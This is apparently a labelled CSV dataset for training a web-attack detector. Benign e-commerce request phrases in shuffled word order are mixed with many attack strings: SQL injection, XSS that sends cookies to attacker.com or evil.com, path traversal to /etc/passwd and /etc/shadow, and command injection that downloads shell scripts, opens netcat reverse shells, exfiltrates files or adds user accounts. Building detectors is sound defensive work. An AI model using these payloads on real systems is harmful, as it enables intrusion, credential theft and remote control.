text,label
../../wp-config.php,1
....//....//etc/passwd,1
admin'--,1
<textarea onfocus=alert(1) autofocus>,1
; curl http://evil.com/$(cat /etc/passwd | base64),1
username=test&password=test,1
GET /.git/config HTTP/1.1,1
1' ORDER BY 10--,1
& ipconfig,1
"; python -c 'import socket,subprocess'",1
file:///etc/passwd,1
number with tracking req1157,0
from current session req1135,0
<details open ontoggle=alert(1)>,1
username=admin&password=monkey,1
last 30 view order for req172,0
view section related products req82,0
../../../../etc/passwd,1
"1 UNION SELECT @@version,NULL--",1
<body background=javascript:alert(1)>,1
jpeg upload format picture profile req792,0
$(whoami),1
1' GROUP BY 1--,1
GET /.git/config HTTP/1.1,1
browse phones category mobile req519,0
..\..\..\windows\system32\drivers\etc\hosts,1
for return policy view product req1107,0
page conditions and view terms req562,0
<details open ontoggle=alert(1)>,1
news get articles feed latest req634,0
username=admin&password=qwerty,1
<ScRiPt>alert(1)</ScRiPt>,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
GET /web.config HTTP/1.1,1
5 product review req695,0
%3Cscript%3Ealert(1)%3C/script%3E,1
username=admin&password=abc123,1
<svg onload=alert(document.domain)>,1
GET /web.config HTTP/1.1,1
range by results req194,0
username=admin&password=monkey,1
| wget http://attacker.com/shell.sh,1
1' OR '1'='1,1
1'; DELETE FROM orders WHERE 1=1--,1
browse mobile category phones req806,0
"1 UNION SELECT @@version,NULL--",1
username=admin&password=batman,1
"1 UNION SELECT username,password FROM users--",1
<svg><script>alert(1)</script></svg>,1
username=admin'/*,1
username=admin&password=admin123,1
username=admin'/*,1
specifications products compare two req724,0
1' OR 1=1--,1
range to 500 price 100 by req1117,0
password and login username with req1059,0
checkout payment credit card with req1153,0
factor enable two authentication req166,0
email with account register new req753,0
1'; DELETE FROM orders WHERE 1=1--,1
tracking with track number req77,0
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
for later item save wishlist to req397,0
history for days req545,0
rate stars 5 req403,0
<object data=javascript:alert(1)>,1
& ipconfig,1
' OR 1=1#,1
<video src=1 onerror=alert(1)>,1
admin' AND 1=1--,1
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
username=admin&password=admin123,1
number track tracking shipment req118,0
"<iframe src=data:text/html,<script>alert(1)</script>>",1
1'; WAITFOR DELAY '0:0:5'--,1
<div onmouseover=alert(1)>hover</div>,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
password reset link req891,0
data report csv as export req332,0
"id=1 AND 1=CONVERT(int,@@version)--",1
php://filter/convert.base64-encode/resource=config.php,1
multiple failed login attempts detected for admin,1
repeated authentication failure admin account locked,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
GET /console HTTP/1.1,1
map store locations req357,0
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
1' OR '1'='1,1
1; DROP TABLE users--,1
account dashboard get req585,0
; ping -c 4 attacker.com,1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
../../wp-config.php,1
username=admin&password=123456,1
"';alert(String.fromCharCode(88,83,83))//",1
GET /admin/config.php HTTP/1.1,1
| wget http://attacker.com/shell.sh,1
; ping -c 4 attacker.com,1
../../../../proc/self/environ,1
; ping -c 4 attacker.com,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
; curl http://evil.com/$(cat /etc/passwd | base64),1
GET /actuator/env HTTP/1.1,1
and terms view conditions page req768,0
<a href='javascript:alert(1)'>click</a>,1
GET /server-status HTTP/1.1,1
rate review product req1056,0
GET /admin/config.php HTTP/1.1,1
to results 100 price range by req219,0
username=admin&password=admin,1
with username login and password req535,0
../../../../var/www/html/config.php,1
view map on store locations req511,0
to support send seller message req1076,0
"1' UNION ALL SELECT NULL,NULL,NULL--",1
subscribe with email req611,0
username=admin'/*,1
password and username with login req60,0
view history days for order req209,0
by brand filter apply req791,0
invoice number order for download req841,0
locations on map req123,0
<textarea onfocus=alert(1) autofocus>,1
recommendations view history on based req420,0
' HAVING 1=1--,1
; ls -la,1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
|| nc -e /bin/sh attacker.com 4444,1
& ipconfig,1
../../../../proc/self/environ,1
admin' AND 1=1--,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
' OR 'x'='x,1
store on locations view req126,0
"1 UNION SELECT @@version,NULL--",1
username=admin&password=qwerty,1
username=admin&password=abc123,1
<div onmouseover=alert(1)>hover</div>,1
<iframe src=javascript:alert('XSS')>,1
request refund support contact req58,0
learning machine books about search req1123,0
products by for req674,0
1' ORDER BY 10--,1
with number track shipment tracking req440,0
repeated authentication failure admin account locked,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
| cat /etc/passwd,1
address shipping for order req529,0
<svg onload=alert(document.domain)>,1
1; DROP TABLE users--,1
1' AND SLEEP(5)--,1
to account language change arabic req353,0
..\..\..\windows\system32\drivers\etc\hosts,1
username=admin&password=admin,1
GET /backup.sql HTTP/1.1,1
<a href='javascript:alert(1)'>click</a>,1
GET /admin/config.php HTTP/1.1,1
& ipconfig,1
username=admin&password=batman,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
' OR 1=1#,1
message send support req468,0
<body onload=alert('XSS')>,1
username=administrator&password=12345,1
; ping -c 4 attacker.com,1
<script>alert('XSS')</script>,1
locations store map req554,0
"1 UNION SELECT @@version,NULL--",1
<body onload=alert('XSS')>,1
"1 UNION SELECT username,password FROM users--",1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
<svg><script>alert(1)</script></svg>,1
preference set express to delivery req1002,0
' OR 1=1#,1
user profile get for account req865,0
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
GET /web.config HTTP/1.1,1
language account change arabic to req906,0
latest news articles get feed req886,0
order number invoice for req344,0
reset link password via req352,0
on based recommendations history view req467,0
support for refund request req1132,0
<input onfocus=alert(1) autofocus>,1
<a href='javascript:alert(1)'>click</a>,1
stars product rate 5 review req14,0
learning books about machine search req645,0
1' ORDER BY 10--,1
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
password=1' OR '1'='1' /*,1
arabic account language req994,0
product return for policy view req239,0
password=1' OR '1'='1' /*,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
repeated authentication failure admin account locked,1
policy product for view return req226,0
tracking shipment track with number req455,0
../.env,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
credit checkout with payment card req630,0
picture jpeg format profile upload req639,0
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
page view terms conditions and req602,0
../../../etc/shadow,1
learning books about req833,0
for view policy return req900,0
language account change req152,0
admin'--,1
"1 UNION SELECT username,password FROM users--",1
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
card checkout credit req424,0
admin' AND 1=1--,1
<<SCRIPT>alert('XSS');//<</SCRIPT>,1
view products section req69,0
last 30 for history req697,0
subscribe with email newsletter to req518,0
repeated authentication failure admin account locked,1
|| nc -e /bin/sh attacker.com 4444,1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
update shipping order address for req165,0
for product policy return view req368,0
"1 UNION SELECT @@version,NULL--",1
1'; DELETE FROM orders WHERE 1=1--,1
GET /actuator/env HTTP/1.1,1
articles latest get news feed req1175,0
order for number invoice download req919,0
username=administrator&password=12345,1
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
username=admin&password=password,1
& net user hacker Password1 /add,1
<body onload=alert('XSS')>,1
and username login password req904,0
GET /server-status HTTP/1.1,1
search products electronics category for by req452,0
1' OR 1=1--,1
1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
browse mobile phones category req1097,0
1' AND SLEEP(5)--,1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
language change arabic account req418,0
link email reset req41,0
| uname -a,1
/etc/passwd%00,1
1' ORDER BY 10--,1
$(whoami),1
; cat /etc/shadow,1
category for products search electronics req1029,0
username=admin&password=superman,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
GET /server-status HTTP/1.1,1
$(whoami),1
username=admin&password=abc123,1
; ls -la,1
../../../etc/shadow,1
../../wp-config.php,1
by brand name filter apply req128,0
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
username=admin&password=admin123,1
<img src=x onerror=alert(1)>,1
| uname -a,1
username=administrator&password=12345,1
; cat /etc/shadow,1
name brand by apply filter req936,0
....//....//etc/passwd,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
number tracking with track shipment req63,0
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
recommendations based history view req144,0
multiple failed login attempts detected for admin,1
for feedback form website submit req1178,0
<img src=x onerror=alert(1)>,1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
<video src=1 onerror=alert(1)>,1
1' AND SLEEP(5)--,1
compare products specifications two req1131,0
delivery set preference express to req428,0
profile upload format req249,0
`id`,1
<input onfocus=alert(1) autofocus>,1
30 last days view history req1087,0
<details open ontoggle=alert(1)>,1
username=admin&password=admin123,1
<body background=javascript:alert(1)>,1
conditions page terms and view req1033,0
username=admin&password=abc123,1
coupon apply at checkout req775,0
1; DROP TABLE users--,1
last history 30 for days req484,0
<textarea onfocus=alert(1) autofocus>,1
set to preference req1138,0
new account email register with req1150,0
by newest listing arrivals sort req1037,0
username=admin&password=batman,1
multiple failed login attempts detected for admin,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
"';alert(String.fromCharCode(88,83,83))//",1
coupon at checkout req816,0
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
order address for update shipping req851,0
../../../../var/www/html/config.php,1
get profile dashboard account user req62,0
for availability check item req1038,0
<select onfocus=alert(1) autofocus>,1
<ScRiPt>alert(1)</ScRiPt>,1
500 results to 100 filter req513,0
username=user&password=pass,1
<textarea onfocus=alert(1) autofocus>,1
username=admin&password=qwerty,1
related section view products req947,0
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
order shipping for update address req709,0
<audio src=1 onerror=alert(1)>,1
' HAVING 1=1--,1
password via link req200,0
GET /server-status HTTP/1.1,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
30 order days req135,0
"1 UNION SELECT username,password FROM users--",1
panel settings notification view req269,0
admin'--,1
file:///etc/passwd,1
picture upload jpeg format profile req879,0
1'; WAITFOR DELAY '0:0:5'--,1
to message send support seller req654,0
%3Cscript%3Ealert(1)%3C/script%3E,1
username=test&password=test,1
<ScRiPt>alert(1)</ScRiPt>,1
<audio src=1 onerror=alert(1)>,1
<a href='javascript:alert(1)'>click</a>,1
two authentication enable factor req99,0
|| nc -e /bin/sh attacker.com 4444,1
GET /.git/config HTTP/1.1,1
invoice download for order number req736,0
| cat /etc/passwd,1
at coupon checkout discount apply req899,0
<textarea onfocus=alert(1) autofocus>,1
notification view settings req379,0
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
view related section products req692,0
"<IMG SRC=`javascript:alert(""XSS"")`>",1
<object data=javascript:alert(1)>,1
support send message seller req964,0
| cat /etc/passwd,1
to wishlist for save req710,0
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
form for feedback req497,0
1' GROUP BY 1--,1
update for address account billing req984,0
and password with login username req732,0
by newest sort listing req797,0
<svg onload=alert(document.domain)>,1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
../../../etc/shadow,1
<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
compare products two specifications req247,0
<svg onload=alert(document.domain)>,1
"1 UNION SELECT username,password FROM users--",1
"<IMG SRC=`javascript:alert(""XSS"")`>",1
account for update req1149,0
with subscribe email to newsletter req1082,0
locations map on view req339,0
GET /crossdomain.xml HTTP/1.1,1
GET /backup.sql HTTP/1.1,1
username=admin&password=abc123,1
support message to send seller req941,0
username=admin&password=superman,1
username=admin&password=qwerty,1
username=user&password=pass,1
link password via req696,0
username=admin&password=superman,1
change to arabic language account req1184,0
<svg onload=alert(document.domain)>,1
repeated authentication failure admin account locked,1
& ipconfig,1
number tracking with shipment req1060,0
password spray attack detected multiple users,1
GET /phpmyadmin HTTP/1.1,1
on history view recommendations based req619,0
at discount checkout coupon apply req343,0
for account address update billing req743,0
map store on locations view req102,0
later item wishlist for save to req557,0
for update address account billing req631,0
login attempt failed username admin invalid credentials,1
|| nc -e /bin/sh attacker.com 4444,1
picture format profile upload req233,0
books search machine req297,0
1'; DELETE FROM orders WHERE 1=1--,1
1' GROUP BY 1--,1
section related view products req953,0
save to wishlist for req483,0
"1 AND 1=2 UNION SELECT 1,2,3--",1
settings notification panel view req500,0
<body onload=alert('XSS')>,1
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
<SCRIPT>alert('XSS')</SCRIPT>,1
GET /console HTTP/1.1,1
' OR 'x'='x,1
<script>alert('XSS')</script>,1
"1 UNION SELECT username,password FROM users--",1
message send support seller to req181,0
admin' AND 1=1--,1
availability store check for item req342,0
store check availability item for req1198,0
email subscribe with newsletter req485,0
articles latest news feed get req666,0
username=admin&password=123456,1
reset password email via link req466,0
<svg><script>alert(1)</script></svg>,1
<body background=javascript:alert(1)>,1
' OR 1=1#,1
1; DROP TABLE users--,1
books about search req322,0
user dashboard profile for account req705,0
1'; EXEC xp_cmdshell('whoami')--,1
username=admin&password=admin123,1
picture upload format jpeg req488,0
notification settings panel view req515,0
login attempt failed username admin invalid credentials,1
password and with req96,0
shipment number track with tracking req3,0
id=2 OR 1=1,1
username=user&password=pass,1
username=admin&password=letmein,1
"name='; INSERT INTO users VALUES('hacker','pass')--",1
../../wp-config.php,1
view on map locations store req838,0
support seller to req908,0
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
username=test&password=test,1
../../../../etc/passwd,1
<svg onload=alert(document.domain)>,1
<ScRiPt>alert(1)</ScRiPt>,1
1; DROP TABLE users--,1
discount checkout apply at req681,0
"; python -c 'import socket,subprocess'",1
page conditions view req989,0
GET /backup.sql HTTP/1.1,1
category mobile phones req818,0
search machine about req244,0
<svg><script>alert(1)</script></svg>,1
<SCRIPT>alert('XSS')</SCRIPT>,1
return view for policy product req657,0
category for products req1077,0
' OR 'x'='x,1
<object data=javascript:alert(1)>,1
%3Cscript%3Ealert(1)%3C/script%3E,1
checkout coupon at apply req1034,0
; whoami,1
GET /crossdomain.xml HTTP/1.1,1
latest get articles news feed req1197,0
username=admin&password=letmein,1
download order for number invoice req542,0
; curl http://evil.com/$(cat /etc/passwd | base64),1
; ls -la,1
id=2 OR 1=1,1
via media link share social product req193,0
brute force attempt on login endpoint from single ip,1
<video src=1 onerror=alert(1)>,1
username=user&password=pass,1
mobile category browse phones req1146,0
price 500 100 results range req794,0
refund for support request contact req100,0
1' AND SLEEP(5)--,1
& net user hacker Password1 /add,1
login attempt failed username admin invalid credentials,1
`id`,1
GET /.git/config HTTP/1.1,1
for update address order req520,0
track tracking number shipment with req612,0
`id`,1
current logout session from req1176,0
GET /actuator/env HTTP/1.1,1
1' OR 1=1--,1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
password reset link email via req1122,0
"<IMG SRC=`javascript:alert(""XSS"")`>",1
brute force attempt on login endpoint from single ip,1
../../../../etc/passwd,1
specifications two compare req271,0
"id=1 AND 1=CONVERT(int,@@version)--",1
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
add item cart to product id req853,0
..\..\..\windows\system32\drivers\etc\hosts,1
password spray attack detected multiple users,1
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
for policy view return product req1042,0
<video src=1 onerror=alert(1)>,1
<body background=javascript:alert(1)>,1
multiple failed login attempts detected for admin,1
based on recommendations history view req112,0
login attempt failed username admin invalid credentials,1
"<IMG SRC=`javascript:alert(""XSS"")`>",1
GET /admin/config.php HTTP/1.1,1
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
feed articles news get latest req1073,0
as report data req168,0
username=root&password=root,1
username=root&password=root,1
by sort arrivals newest listing req70,0
& net user hacker Password1 /add,1
download number invoice order for req752,0
download order invoice req207,0
GET /actuator/env HTTP/1.1,1
/var/log/apache2/access.log,1
../../../../proc/self/environ,1
express to delivery preference set req1173,0
& ipconfig,1
social link via product req224,0
<SCRIPT>alert('XSS')</SCRIPT>,1
mobile browse phones category req108,0
"1 AND 1=2 UNION SELECT 1,2,3--",1
<SCRIPT>alert('XSS')</SCRIPT>,1
1' OR 1=1--,1
<a href='javascript:alert(1)'>click</a>,1
<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
username=admin&password=admin,1
/etc/passwd%00,1
multiple failed login attempts detected for admin,1
brute force attempt on login endpoint from single ip,1
panel view notification settings req348,0
....//....//etc/passwd,1
| wget http://attacker.com/shell.sh,1
' OR 1=1#,1
username=admin'/*,1
credit checkout payment with req479,0
form feedback submit website for req935,0
number tracking shipment req13,0
admin'--,1
1'; WAITFOR DELAY '0:0:5'--,1
multiple failed login attempts detected for admin,1
csv report data export req1177,0
| wget http://attacker.com/shell.sh,1
email reset password req993,0
<SCRIPT>alert('XSS')</SCRIPT>,1
media link share product via req248,0
check availability item store for req571,0
' OR 1=1#,1
| wget http://attacker.com/shell.sh,1
|| nc -e /bin/sh attacker.com 4444,1
& net user hacker Password1 /add,1
machine learning search books req917,0
../../.git/config,1
<object data=javascript:alert(1)>,1
username=admin&password=password,1
phones browse mobile category req897,0
1; DROP TABLE users--,1
history on based recommendations req677,0
1'; EXEC xp_cmdshell('whoami')--,1
latest articles get req591,0
"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
"1' UNION ALL SELECT NULL,NULL,NULL--",1
1'; EXEC xp_cmdshell('whoami')--,1
/etc/passwd%00,1
for store item check req457,0
username=admin&password=admin,1
username=admin&password=superman,1
jpeg picture upload format req598,0
|| nc -e /bin/sh attacker.com 4444,1
account arabic change language to req830,0
repeated authentication failure admin account locked,1
username=admin&password=admin,1
....//....//etc/passwd,1
filter 500 to req1182,0
products two compare req927,0
password spray attack detected multiple users,1
& ipconfig,1
| uname -a,1
policy view return req747,0
<audio src=1 onerror=alert(1)>,1
1; DROP TABLE users--,1
password=1' OR '1'='1' /*,1
page view conditions terms and req1063,0
products compare two specifications req311,0
../../.git/config,1
export data as req1009,0
javascript:alert(document.cookie),1
<audio src=1 onerror=alert(1)>,1
reset password link email via req1199,0
' OR 'x'='x,1
track tracking shipment with number req1091,0
"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
arabic change to account language req377,0
| uname -a,1
category search for by electronics products req90,0
id=2 OR 1=1,1
id=2 OR 1=1,1
new with account register email req907,0
; curl http://evil.com/$(cat /etc/passwd | base64),1
check availability store for item req855,0
language change account arabic to req107,0
"1' UNION ALL SELECT NULL,NULL,NULL--",1
javascript:alert(document.cookie),1
<img src=x onerror=alert(1)>,1
settings panel notification view req229,0
"<IMG SRC=`javascript:alert(""XSS"")`>",1
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
../.env,1
' HAVING 1=1--,1
phones mobile category req945,0
<svg><script>alert(1)</script></svg>,1
username=admin&password=qwerty,1
login attempt failed username admin invalid credentials,1
GET /backup.sql HTTP/1.1,1
| uname -a,1
; cat /etc/shadow,1
"1 UNION SELECT @@version,NULL--",1
<img src=x onerror=alert(1)>,1
username=admin&password=1234567890,1
; ping -c 4 attacker.com,1
GET /web.config HTTP/1.1,1
GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
shipping address for update req354,0
repeated authentication failure admin account locked,1
view section related products req790,0
javascript:alert(document.cookie),1
1' ORDER BY 10--,1
to send support seller message req425,0
../../../etc/shadow,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
share social product media req71,0
username=admin'/*,1
add id to cart req854,0
submit feedback form req345,0
<div onmouseover=alert(1)>hover</div>,1
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
username=administrator&password=12345,1
/var/log/apache2/access.log,1
contact support request for refund req134,0
username=test&password=test,1
jpeg profile picture req472,0
<iframe src=javascript:alert('XSS')>,1
subscribe email to with newsletter req589,0
apply filter by brand name req659,0
<IMG SRC=JaVaScRiPt:alert('XSS')>,1
....//....//etc/passwd,1
search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
policy product for return view req590,0
"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
"<IMG SRC=`javascript:alert(""XSS"")`>",1
<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
' OR 'x'='x,1
at discount coupon apply checkout req615,0
<img src=x onerror=alert(1)>,1
../../../../var/www/html/config.php,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
1' OR 1=1--,1
for last history 30 order days req1048,0
<audio src=1 onerror=alert(1)>,1
username=admin&password=abc123,1
& net user hacker Password1 /add,1
username=admin&password=batman,1
/etc/passwd%00,1
session from current logout req201,0
$(whoami),1
<script>alert('XSS')</script>,1
name by apply brand req1046,0
<ScRiPt>alert(1)</ScRiPt>,1
"' UNION SELECT 1,table_name FROM information_schema.tables--",1
"<iframe src=data:text/html,<script>alert(1)</script>>",1
1' AND SLEEP(5)--,1
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
id=2 OR 1=1,1
"1 AND 1=2 UNION SELECT 1,2,3--",1
id=2 OR 1=1,1
by electronics search for req622,0
GET /.git/config HTTP/1.1,1
GET /web.config HTTP/1.1,1
; ping -c 4 attacker.com,1
with email newsletter to subscribe req1040,0
from logout session current req972,0
price 500 to by filter req539,0
password=1' OR '1'='1' /*,1
and username password with login req616,0
1' GROUP BY 1--,1
settings view panel req1064,0
category browse mobile phones req67,0
view terms and conditions req575,0
view for days history req238,0
1' OR 1=1--,1
email with newsletter to subscribe req987,0
products related view req581,0
profile upload format picture jpeg req476,0
; whoami,1
brand name by req1190,0
login password with username req898,0
policy for view product return req11,0
password email reset req704,0
; curl http://evil.com/$(cat /etc/passwd | base64),1
"<IMG SRC=`javascript:alert(""XSS"")`>",1
view on based req1005,0
by filter name brand apply req974,0
sort arrivals listing newest by req798,0
language change arabic account req148,0
"name='; INSERT INTO users VALUES('hacker','pass')--",1
coupon apply at discount checkout req380,0
GET /admin/config.php HTTP/1.1,1
as data report csv req220,0
"1 UNION SELECT @@version,NULL--",1
current from session logout req251,0
`id`,1
GET /server-status HTTP/1.1,1
| wget http://attacker.com/shell.sh,1
username=admin&password=letmein,1
1' ORDER BY 10--,1
policy view for req1105,0
| cat /etc/passwd,1
GET /actuator/env HTTP/1.1,1
<script>alert('XSS')</script>,1
brute force attempt on login endpoint from single ip,1
